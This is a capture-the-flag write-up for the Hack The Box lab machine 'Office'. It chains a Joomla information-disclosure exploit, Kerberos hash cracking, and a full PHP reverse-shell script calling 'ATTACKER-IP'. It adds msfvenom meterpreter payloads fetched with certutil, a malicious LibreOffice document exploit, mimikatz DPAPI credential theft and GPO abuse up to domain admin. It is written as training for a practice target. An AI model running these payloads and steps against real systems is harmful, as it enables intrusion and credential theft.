# Office

![](https://i.imgur.com/Xlv1cOI.png)

***

Running our nmap scan we have


```
# Nmap 7.94SVN scan initiated Tue Feb 20 14:16:29 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt 10.129.104.195
Increasing send delay for 10.129.104.195 from 0 to 5 due to 48 out of 119 dropped probes since last increase.
Increasing send delay for 10.129.104.195 from 5 to 10 due to 11 out of 18 dropped probes since last increase.
Nmap scan report for 10.129.104.195
Host is up (0.15s latency).
Not shown: 65520 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 1B6942E22443109DAEA739524AB74123
| http-robots.txt: 16 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
|_SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
|_ssl-date: TLS randomness does not represent time
443/tcp   open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
|_SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
|_SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
|_SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
52884/tcp open  msrpc         Microsoft Windows RPC
55781/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h59m53s
| smb2-time: 
|   date: 2024-02-20T21:20:47
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 20 14:21:38 2024 -- 1 IP address (1 host up) scanned in 308.82 seconds
```


As we can see this is an Active directory environment let go ahead and start our enumeration with the FQDN of `office.htb` and `DC.office.htb` as the domain controller


## [LDAP](#LDAP)

Using this command to enumerate users on the DC we don't get any output


```
ldapsearch -x -H ldap://10.10.11.3 -b "DC=DC,DC=OFFICE,DC=HTB" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```


![](https://i.imgur.com/IrbSA18.png)




Navigating to port 80/HTTP we have a page running on Joomla


![](https://i.imgur.com/hBhAmwE.png)




Checking the `/administrator` page, we tried several attempts and can't bypass it


![](https://i.imgur.com/yvFnnm3.png)


Checking the `/README.txt` path we have the Joomla version


![](https://i.imgur.com/PppM1mr.png)


searching for Joomla `4.2` exploit we have an **# Unauthenticated information disclosure** exploit




![](https://i.imgur.com/oHSSb5I.png)


We can get an exploit from [here](https://github.com/Acceis/exploit-CVE-2023-23752.git) known as `CVE-2023-23752` 



![](https://i.imgur.com/fAfuSmE.png)



Go ahead and install the requirements, because the exploit runs with ruby


```
sudo gem install httpx docopt paint
```


![](https://i.imgur.com/vLBOtk6.png)



Running the exploit we truly have the administrator password




![](https://i.imgur.com/0ZrZhGV.png)


Tried the password with the usernames to the extent of lockout and was sure this isn't the right path

![](https://i.imgur.com/LI0k1Wb.png)


Then i decided to enumerate usernames using kerbrute and save them into a TXT file

```
kerbrute userenum --dc 10.10.11.3 --domain office.htb /opt/jsmith.txt
```


![](https://i.imgur.com/gOscj0o.png)

Then used crackmapexec to try to bruteforce login in which the password turned out to work for user `dwolfe:H0lOgrams4reTakIng0Ver754!`



![](https://i.imgur.com/nHVeBjT.png)


After this i decided to enumerate the share for this user and found a share called `SOC Analysis`


![](https://i.imgur.com/X4mhiun.png)


Checking this share we can't put files into it but we found a pcap file named `Latest-System-Dump-8fbc124d.pcap`


![](https://i.imgur.com/Br6z13e.png)


We can download this file into our local machine and since this is a large file, we have to use the option below if not you might get the error `parallel_read returned NT_STATUS_IO_TIMEOUT`


```
smbclient \\\\10.10.11.3\\'SOC Analysis' -U dwolfe --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072'
```


![](https://i.imgur.com/66m0Y62.png)


Opening this data with wireshark and searching for `keberos` we do have a data with a kerberos hash


![](https://i.imgur.com/yCI6rfO.png)



I also found the common name for the hash which is user `tstark`



![](https://i.imgur.com/pnmEjNt.png)


We can then go ahead and crack this hash with hashcat but first of all add the prefix, `$krb5pa$18$tstark$OFFICE.HTB$` to the front of the hash, so it can be identified by hashcat, you can also use this [article](https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/) to learn more


```
❯ hashcat -m 19900 hash.txt /usr/share/wordlists/rockyou.txt -O
```


![](https://i.imgur.com/YNpeiCc.png)


```
tstark:playboy69
```


We can verify that this password works using crackmapexec also

![](https://i.imgur.com/fmuXJel.png)



Also tried this password out on the Joomla login page and it worked for the user **administrator** 


![](https://i.imgur.com/kdVHpTu.png)



Then navigate to **system** menu and click **Site Templates**


![](https://i.imgur.com/YnmrY5e.png)

Select "**Cassiopeia Details and Files**" 



![](https://i.imgur.com/uhpu29A.png)


We can then go ahead and edit any PHP file on this template by replacing the contents with the below contents


```pHP
<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = 'cmd';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\n");
                    do {
						$status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('ATTACKER-IP', 4444);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
```



Hit **Save** and make sure to note down the path



![](https://i.imgur.com/4fk4JvO.png)



Go ahead and start up your reverse shell and navigate to the path in which was noted down to get a reverse shell


```
rlwrap nc -lvnp 4444
```


![](https://i.imgur.com/2tA4cVe.png)


Running the below command we can enumerate users on this system

```
net user /domain
```


![](https://i.imgur.com/U4QXAZS.png)


Navigating to the `web_account` **Desktop** directory i found a `RunasCs.exe` binary 




![](https://i.imgur.com/jlJztYT.png)


> _RunasCs_ is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials. This tool is an improved and open version of windows builtin _runas.exe_ that solves some limitations


We can attempt to get a reverse shell as user `tstark` with this utility, first of all generate a msfvenom payload for reverse shell and transfer to the `web_account` host with `certutil`


```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER-IP> LPORT=1337 -f exe -o shell.exe

# Host file
python3 -m http.server 80

# Transfer file
certutil.exe -urlcache -split -f http://10.10.14.199/shell.exe shell.exe
```


![](https://i.imgur.com/sD83PaM.png)

After few attempts to use `RunasCs.exe` like this, i seem to get a permission error but lucky for us we can still get a reverse shell with netcat using powershell


```
# Target
RunasCs.exe tstark playboy69 powershell -r 10.10.14.199:9001

# Attacker
nc -lvnp 9000
```


![](https://i.imgur.com/MiSugvq.png)


We can then go ahead and submit the user flag on the desktop of user `tstark`

![](https://i.imgur.com/wfvs2CA.png)


Then i decided to upload `SharpHound.exe` and then get a graphical view/attack path to Domain Admin


![](https://i.imgur.com/xE0roGB.png)

We can then run `SharpHound.exe` and then get a meterpreter shell as user `tstark` to download the file 


```
Sharphound.exe --CollectionMethods All
```

![](https://i.imgur.com/yHGFq6x.png)


Now get meterpreter shell as user tstark

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 10.10.14.199
set lport 1337
exploit
```



![](https://i.imgur.com/MaZufq8.png)


then download the file generated by `SharpHound.exe`



![](https://i.imgur.com/NdjriEM.png)


Checking bloodhound the user `ppots` and `tstark` both have a session to the DC, meaning we have to target user `ppots` now



![](https://i.imgur.com/VxrPwkr.png)


Performing enumeration on the `web_account` host, i found out that there was an outdated Libre Office version in which we can confirm through the `readme_en-US.txt` file located under `C:\Program Files\LibreOffice 5\readmes`


![](https://i.imgur.com/BYCtG5U.png)


Checking google i found a suitable exploit


![](https://i.imgur.com/VfyKra0.png)


First of all generate another `shell.exe` file and transfer to target directory under `C:\users\public\` (make sure to use the `web_account` target to do this)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.199 LPORT=5656 -f exe -o shell.exe
```

![](https://i.imgur.com/DrupGlo.png)

Transfer file to target

```
certutil.exe -urlcache -split -f http://10.10.14.199/shell.exe shell.exe
```


![](https://i.imgur.com/ZPk14M1.png)


Then download the Libre office exploit from [here](https://github.com/elweth-sec/CVE-2023-2255)


![](https://i.imgur.com/4MqN1qv.png)


Then create a `.odt` file with the tool

```
❯ python3 CVE-2023-2255.py --cmd "c:\users\public\shell.exe" --output whatever.odt
```

![](https://i.imgur.com/ZjRdsqX.png)


Then transfer the file `whatever.odt` to `C:\xampp\htdocs\internal\applications\`


![](https://i.imgur.com/52vIsCn.png)



Now get meterpreter shell as user `ppots`

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 10.10.14.199
set lport 5656
exploit
```



![](https://i.imgur.com/nP545sM.png)


Then change directory to the desktop of `ppotts` and upload `mimikatz.exe`



![](https://i.imgur.com/hbcpZ8b.png)

Running the `vault::list` command on mimikatz we can see that 

![](https://i.imgur.com/lE0kB7p.png)

First of all get the SID of current user

```
wmic useraccount get name,sid
```


![](https://i.imgur.com/CXT0wBT.png)

Use the SID at the end of this path `C:\Users\<CURRENT-USER-USERNAME>\AppData\Roaming\Microsoft\protect\` to get the vault credentials

```
dir /a:h C:\Users\ppotts\AppD
ata\Roaming\Microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107
```


![](https://i.imgur.com/JIGWuv2.png)


We will start we the second vault credentials and then use it to get valid master keys

```
mimikatz # dpapi::masterkey /in:C:\Users\PPotts\AppData\Roaming\Microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc
```


![](https://i.imgur.com/NzAaAaB.png)

Scrolling down you should see a key for RPC, note this down

![](https://i.imgur.com/ZRkNvHf.png)


Check the Dpapi cache for the right `GUID` we would use to search for the protected credential file

```
mimikatz # dpapi::cache
```

![](https://i.imgur.com/SM6AZag.png)




Now let enumerate for protected credentials files, you can use this [article](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) to learn about hunting it


```
dir /a:h C:\Users\ppotts\AppData\Roaming\Microsoft\Credentials\
```


![](https://i.imgur.com/RRuO2G1.png)


As we can see the `giudMasterKey` for the `84F1CAEEBF466550F4967858F9353FB4` protected file matches the one we found earlier in the Dpapi cache

```
mimikatz # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4                                                               
```


![](https://i.imgur.com/Z56HRO5.png)


Now use it to get `HHogan` creds


```
dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
```


![](https://i.imgur.com/vS2IDqW.png)



> Note that if you get an empty `CredentialBlob:`, probably on another engagements and there are multiple **vault credentials**, also run this same steps on the others, as there might be stored credentials there


We can then login as user `hhogan` with the credential gotten


![](https://i.imgur.com/IZ0Q5MI.png)


Navigating to bloodhound we can see that user `hhogan` belongs to the **GPO MANAGERS** group and every member of this group has **`GenericWrite`** to the **"DEFAULT DOMAIN CONTROLLERS POLICY"** AND **"DEFAULT DOMAIN POLICY"** Group Policy Objects


![](https://i.imgur.com/8h4O9e1.png)


Checking the "**Find Shortest Paths to Domain Admins**" node, we can see that the **"DEFAULT DOMAIN POLICY"** GPO is linked to the **OFFICE.HTB** domain and in this domain belongs to the **USERS** container, this same **USERS** container also contains the **DOMAIN ADMINS** group 


![](https://i.imgur.com/xReovLT.png)


We can abuse this using `SharpGPOAbuse` Go ahead and download `SharpGPOAbuse.exe` from [here](https://github.com/byronkg/SharpGPOAbuse/blob/main/SharpGPOAbuse-master/SharpGPOAbuse.exe) and upload it to our target computer using the `upload` function of `Evil-WinRM`

![](https://i.imgur.com/YXarX1c.png)


Then list all GPOs in the domain just to make sure you have connection to the Domain Controller


![](https://i.imgur.com/FaKq3jt.png)


Now using `SharpGPOAbuse.exe` add the user `hhogan` to the local administrator group on the Domain Controller



```powershell
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount HHogan --GPOName "Default Domain Policy"

# Force an immediate policy update
gpupdate /force
```



![](https://i.imgur.com/P34oE8x.png)



We can verify that this policy has been added by checking what groups user `hhogan` belongs to


```powershell
net user hhogan /domain
```


![](https://i.imgur.com/nwLjjXx.png)

We can then login via `psexec.py` and grab the root flag


```bash
rlwrap psexec.py hhogan@10.10.11.3
```


![](https://i.imgur.com/aFA3zXR.png)



GG
